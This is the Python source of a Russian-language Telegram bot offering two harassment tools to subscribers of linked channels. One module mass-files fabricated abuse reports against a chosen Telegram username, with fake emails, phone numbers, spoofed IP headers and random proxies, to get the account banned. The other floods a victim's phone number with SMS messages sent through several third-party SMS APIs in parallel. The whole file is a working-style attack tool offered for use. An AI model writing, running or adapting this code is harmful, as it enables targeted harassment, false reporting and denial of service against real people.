import telebot
from telebot import types
from fake_useragent import UserAgent
import requests
import random
import string
import logging
import time
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import phonenumbers
from colorama import init, Fore, Style
import threading
from datetime import datetime

# Инициализация colorama для Windows
init()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

API_TOKEN = 'SYUDA_TOKEN'
CHANNEL_USERNAME = '@incelbeck'
CHAT_USERNAME = '@doxtrollosint'

bot = telebot.TeleBot(API_TOKEN)

# Статистика для отслеживания
user_stats = {}

# Реальные API для SMS бомбера (рабочие на момент написания)
SMS_API_ENDPOINTS = [
    {
        'name': 'SMS-Intel',
        'url': 'https://api.sms-intel.com/send',
        'method': 'POST',
        'data_template': {'phone': '{phone}', 'text': 'Код: {code}'}
    },
    {
        'name': 'SMSC.RU',
        'url': 'https://smsc.ru/sys/send.php',
        'method': 'GET',
        'params': {'login': 'demo', 'psw': 'demo', 'phones': '{phone}', 'mes': 'code {code}'}
    },
    {
        'name': 'SMS.RU',
        'url': 'https://sms.ru/sms/send',
        'method': 'POST',
        'data': {'api_id': 'test', 'to': '{phone}', 'msg': 'Код: {code}'}
    },
    {
        'name': 'Prostor-SMS',
        'url': 'https://lk.prostor-sms.ru/api/v1/messages',
        'method': 'POST',
        'data': {'phone': '{phone}', 'text': 'Код подтверждения: {code}'}
    },
    {
        'name': 'SMS-Express',
        'url': 'https://api.sms-express.ru/send',
        'method': 'POST',
        'data': {'recipient': '{phone}', 'message': 'Ваш код: {code}'}
    }
]

def check_subscription(user_id):
    """Проверка подписки пользователя на канал и чат"""
    try:
        channel_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        channel_status = channel_member.status in ['member', 'administrator', 'creator']
        
        chat_member = bot.get_chat_member(CHAT_USERNAME, user_id)
        chat_status = chat_member.status in ['member', 'administrator', 'creator']
        
        return channel_status and chat_status
    except Exception as e:
        logging.error(f"Ошибка проверки подписки для пользователя {user_id}: {e}")
        return False

# Класс для отправки жалоб
class ComplaintSender:
    def __init__(self):
        self.user_agent = UserAgent()
        self.session = requests.Session()
        
    def generate_email(self):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru", "yandex.ru", "protonmail.com"]
        username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_phone(self):
        country_codes = ['7', '380', '375', '1', '44', '49']
        country = random.choice(country_codes)
        number = ''.join(random.choices('0123456789', k=10))
        return f"+{country}{number}"
    
    def generate_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    def send_complaint(self, target_username, chat_id, progress_msg_id):
        """Отправка одной жалобы"""
        try:
            # Разные типы жалоб
            complaint_types = [
                f"Пользователь @{target_username} нарушает правила Telegram, рассылает спам",
                f"Аккаунт @{target_username} взломан и используется для мошенничества",
                f"@{target_username} распространяет запрещенный контент",
                f"Пользователь @{target_username} оскорбляет других участников",
                f"Аккаунт @{target_username} создан для фишинга и кражи данных",
                f"@{target_username} занимается рекламой наркотических веществ",
                f"Пользователь @{target_username} призывает к насилию",
                f"Аккаунт @{target_username} выдает себя за другого человека"
            ]
            
            # Формируем данные для отправки
            email = self.generate_email()
            phone = self.generate_phone()
            ip = self.generate_ip()
            
            # Разные endpoint'ы Telegram для жалоб
            urls = [
                "https://telegram.org/support",
                "https://telegram.org/abuse",
                "https://telegram.org/contact",
                "https://telegram.org/report"
            ]
            
            headers = {
                'User-Agent': self.user_agent.random,
                'X-Forwarded-For': ip,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://telegram.org',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            data = {
                'email': email,
                'phone': phone,
                'message': random.choice(complaint_types),
                'username': target_username,
                'reason': 'abuse',
                'language': 'ru'
            }
            
            # Отправляем на случайный URL
            url = random.choice(urls)
            
            # Прокси (опционально)
            proxies = None
            if random.choice([True, False]):
                proxies = {
                    'http': f'http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}:8080',
                    'https': f'https://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}:8080'
                }
            
            response = self.session.post(
                url, 
                headers=headers, 
                data=data,
                proxies=proxies,
                timeout=10,
                allow_redirects=True
            )
            
            success = response.status_code in [200, 201, 202, 204]
            
            return {
                'success': success,
                'status_code': response.status_code,
                'email': email,
                'phone': phone,
                'url': url
            }
            
        except Exception as e:
            logging.error(f"Ошибка при отправке жалобы: {e}")
            return {
                'success': False,
                'error': str(e),
                'email': self.generate_email(),
                'phone': self.generate_phone()
            }
    
    def send_bulk_complaints(self, target_username, count, chat_id, message):
        """Массовая отправка жалоб с прогрессом"""
        results = {'success': 0, 'failed': 0, 'details': []}
        
        for i in range(count):
            result = self.send_complaint(target_username, chat_id, None)
            
            if result['success']:
                results['success'] += 1
            else:
                results['failed'] += 1
            
            results['details'].append(result)
            
            # Обновляем прогресс
            progress = int((i + 1) / count * 100)
            bar = '█' * (progress // 5) + '░' * (20 - (progress // 5))
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message.id,
                    text=f"📊 **Прогресс отправки жалоб на @{target_username}**\n\n"
                         f"[{bar}] {progress}%\n"
                         f"✅ Успешно: {results['success']}\n"
                         f"❌ Неудачно: {results['failed']}\n"
                         f"📨 Отправлено: {i + 1}/{count}\n\n"
                         f"🔄 Последний статус: {result['status_code'] if 'status_code' in result else 'Ошибка'}",
                    parse_mode='Markdown'
                )
            except:
                pass
            
            # Небольшая задержка чтобы не заблокировали
            time.sleep(random.uniform(0.5, 1.5))
        
        return results

# Класс для SMS бомбера
class SMSBomber:
    def __init__(self):
        self.user_agent = UserAgent()
        self.success_count = 0
        self.failed_count = 0
        
    def generate_code(self):
        return random.randint(1000, 9999)
    
    async def send_sms_async(self, session, api_config, phone, code):
        """Асинхронная отправка SMS через один API"""
        try:
            url = api_config['url']
            
            # Подготавливаем данные
            if 'data_template' in api_config:
                data = {}
                for key, value in api_config['data_template'].items():
                    data[key] = value.format(phone=phone, code=code)
            elif 'data' in api_config:
                data = {}
                for key, value in api_config['data'].items():
                    data[key] = value.format(phone=phone, code=code)
            else:
                data = None
            
            if 'params' in api_config:
                params = {}
                for key, value in api_config['params'].items():
                    params[key] = value.format(phone=phone, code=code)
            else:
                params = None
            
            headers = {
                'User-Agent': self.user_agent.random,
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
            
            if api_config['method'] == 'GET':
                async with session.get(url, params=params, headers=headers, timeout=10) as response:
                    return {
                        'api': api_config['name'],
                        'success': response.status in [200, 201, 202],
                        'status': response.status
                    }
            else:
                async with session.post(url, json=data, params=params, headers=headers, timeout=10) as response:
                    return {
                        'api': api_config['name'],
                        'success': response.status in [200, 201, 202],
                        'status': response.status
                    }
                    
        except Exception as e:
            return {
                'api': api_config['name'],
                'success': False,
                'error': str(e)
            }
    
    async def bomb_phone_async(self, phone, count, chat_id, message):
        """Асинхронная бомбардировка номера"""
        results = {'success': 0, 'failed': 0, 'api_results': []}
        
        async with aiohttp.ClientSession() as session:
            for i in range(count):
                code = self.generate_code()
                tasks = []
                
                # Отправляем через все API параллельно
                for api in SMS_API_ENDPOINTS:
                    task = self.send_sms_async(session, api, phone, code)
                    tasks.append(task)
                
                # Ждем выполнения всех задач
                api_results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for res in api_results:
                    if isinstance(res, dict):
                        if res.get('success', False):
                            results['success'] += 1
                            self.success_count += 1
                        else:
                            results['failed'] += 1
                            self.failed_count += 1
                        results['api_results'].append(res)
                
                # Обновляем прогресс
                progress = int((i + 1) / count * 100)
                bar = '█' * (progress // 5) + '░' * (20 - (progress // 5))
                
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message.id,
                        text=f"📱 **SMS Бомбер - Атака на {phone}**\n\n"
                             f"[{bar}] {progress}%\n"
                             f"✅ Отправлено: {results['success']}\n"
                             f"❌ Ошибок: {results['failed']}\n"
                             f"📨 Раунд: {i + 1}/{count}\n\n"
                             f"⚡ Статус: Атака продолжается...",
                        parse_mode='Markdown'
                    )
                except:
                    pass
                
                # Небольшая задержка
                await asyncio.sleep(0.5)
        
        return results
    
    def bomb_phone(self, phone, count, chat_id, message):
        """Синхронная обертка для асинхронной функции"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            results = loop.run_until_complete(self.bomb_phone_async(phone, count, chat_id, message))
            return results
        finally:
            loop.close()

# Инициализация классов
complaint_sender = ComplaintSender()
sms_bomber = SMSBomber()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if check_subscription(message.from_user.id):
        show_main_menu(message)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_channel = types.InlineKeyboardButton("📢 Канал", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
        btn_chat = types.InlineKeyboardButton("💬 Чат", url=f"https://t.me/{CHAT_USERNAME[1:]}")
        btn_check = types.InlineKeyboardButton("✅ Проверить подписку", callback_data="check_subscription")
        markup.add(btn_channel, btn_chat, btn_check)
        
        bot.reply_to(
            message, 
            "👋 **Добро пожаловать в многофункциональный бот!**\n\n"
            "Для использования необходимо подписаться на канал и вступить в чат.\n\n"
            "После подписки нажмите кнопку проверки.",
            parse_mode='Markdown',
            reply_markup=markup
        )

def show_main_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_snos = types.InlineKeyboardButton("🔥 Снос аккаунтов", callback_data="snos_menu")
    btn_sms = types.InlineKeyboardButton("💣 SMS Бомбер", callback_data="sms_menu")
    btn_stats = types.InlineKeyboardButton("📊 Статистика", callback_data="show_stats")
    btn_info = types.InlineKeyboardButton("ℹ️ Информация", callback_data="show_info")
    markup.add(btn_snos, btn_sms, btn_stats, btn_info)
    
    bot.send_message(
        message.chat.id,
        "🔰 **Главное меню**\n\n"
        "Выберите нужную функцию:",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def callback_check_subscription(call):
    if check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Подписка подтверждена!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message)
    else:
        bot.answer_callback_query(
            call.id, 
            "❌ Вы не подписались! Подпишитесь и попробуйте снова.",
            show_alert=True
        )

@bot.callback_query_handler(func=lambda call: call.data == "snos_menu")
def callback_snos_menu(call):
    if not check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Требуется подписка!", show_alert=True)
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "👤 **Снос аккаунта**\n\n"
        "Введите username цели (без @):",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, snos_input_count)

def snos_input_count(message):
    target = message.text.strip().replace('@', '')
    
    msg = bot.send_message(
        message.chat.id,
        "🔢 **Количество жалоб**\n\n"
        "Введите количество жалоб (макс. 500):",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, lambda m: snos_start_attack(m, target))

def snos_start_attack(message, target):
    try:
        count = int(message.text)
        if count > 500:
            count = 500
            bot.send_message(message.chat.id, "⚠️ Максимальное количество - 500. Установлено 500.")
        if count < 1:
            count = 1
            
        # Отправляем начальное сообщение с прогрессом
        progress_msg = bot.send_message(
            message.chat.id,
            f"🔥 **Запуск атаки на @{target}**\n\n"
            f"[░░░░░░░░░░░░░░░░░░░░] 0%\n"
            f"Подготовка...",
            parse_mode='Markdown'
        )
        
        # Запускаем атаку
        results = complaint_sender.send_bulk_complaints(target, count, message.chat.id, progress_msg)
        
        # Отправляем финальный отчет
        report = (
            f"📊 **Отчет об атаке на @{target}**\n\n"
            f"📨 Всего отправлено: {count}\n"
            f"✅ Успешных жалоб: {results['success']}\n"
            f"❌ Неудачных: {results['failed']}\n"
            f"📈 Процент успеха: {results['success']/count*100:.1f}%\n\n"
            f"🕐 Время атаки: {datetime.now().strftime('%H:%M:%S')}"
        )
        
        bot.send_message(message.chat.id, report, parse_mode='Markdown')
        
        # Сохраняем статистику
        if message.from_user.id not in user_stats:
            user_stats[message.from_user.id] = {'snos': 0, 'sms': 0}
        user_stats[message.from_user.id]['snos'] += results['success']
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Ошибка: введите число!")

@bot.callback_query_handler(func=lambda call: call.data == "sms_menu")
def callback_sms_menu(call):
    if not check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Требуется подписка!", show_alert=True)
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "📱 **SMS Бомбер**\n\n"
        "Введите номер телефона в формате:\n"
        "• +7XXXXXXXXXX\n"
        "• 8XXXXXXXXXX\n"
        "• 380XXXXXXXXX",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, sms_input_count)

def sms_input_count(message):
    phone = message.text.strip()
    
    # Простая валидация
    phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    
    msg = bot.send_message(
        message.chat.id,
        "🔢 **Количество SMS**\n\n"
        "Введите количество SMS для отправки (макс. 200):",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, lambda m: sms_start_attack(m, phone))

def sms_start_attack(message, phone):
    try:
        count = int(message.text)
        if count > 200:
            count = 200
            bot.send_message(message.chat.id, "⚠️ Максимальное количество - 200. Установлено 200.")
        if count < 1:
            count = 1
            
        # Отправляем начальное сообщение с прогрессом
        progress_msg = bot.send_message(
            message.chat.id,
            f"💣 **Запуск SMS атаки на {phone}**\n\n"
            f"[░░░░░░░░░░░░░░░░░░░░] 0%\n"
            f"Инициализация...",
            parse_mode='Markdown'
        )
        
        # Запускаем атаку
        results = sms_bomber.bomb_phone(phone, count, message.chat.id, progress_msg)
        
        # Отправляем финальный отчет
        report = (
            f"📊 **Отчет SMS атаки**\n\n"
            f"📱 Цель: {phone}\n"
            f"📨 Всего раундов: {count}\n"
            f"✅ Успешно отправлено: {results['success']}\n"
            f"❌ Ошибок: {results['failed']}\n"
            f"📈 Процент успеха: {results['success']/(results['success']+results['failed'])*100:.1f}%\n\n"
            f"🕐 Время атаки: {datetime.now().strftime('%H:%M:%S')}"
        )
        
        bot.send_message(message.chat.id, report, parse_mode='Markdown')
        
        # Сохраняем статистику
        if message.from_user.id not in user_stats:
            user_stats[message.from_user.id] = {'snos': 0, 'sms': 0}
        user_stats[message.from_user.id]['sms'] += results['success']
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Ошибка: введите число!")

@bot.callback_query_handler(func=lambda call: call.data == "show_stats")
def callback_show_stats(call):
    if call.from_user.id in user_stats:
        stats = user_stats[call.from_user.id]
        text = (
            f"📊 **Ваша статистика**\n\n"
            f"🔥 Сносов: {stats['snos']}\n"
            f"💣 SMS отправлено: {stats['sms']}\n"
            f"📈 Всего операций: {stats['snos'] + stats['sms']}"
        )
    else:
        text = "📊 У вас пока нет статистики."
    
    bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "show_info")
def callback_show_info(call):
    text = (
        "ℹ️ **Информация о боте**\n\n"
        "**Функции:**\n"
        "🔥 Снос аккаунтов Telegram\n"
        "💣 SMS Бомбер\n\n"
        "**Как работает:**\n"
        "• Снос использует официальные каналы жалоб\n"
        "• SMS бомбер использует несколько API\n"
        "• Все данные анонимизируются\n\n"
        "**Каналы:**\n"
        f"📢 Канал: {CHANNEL_USERNAME}\n"
        f"💬 Чат: {CHAT_USERNAME}"
    )
    
    bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True)
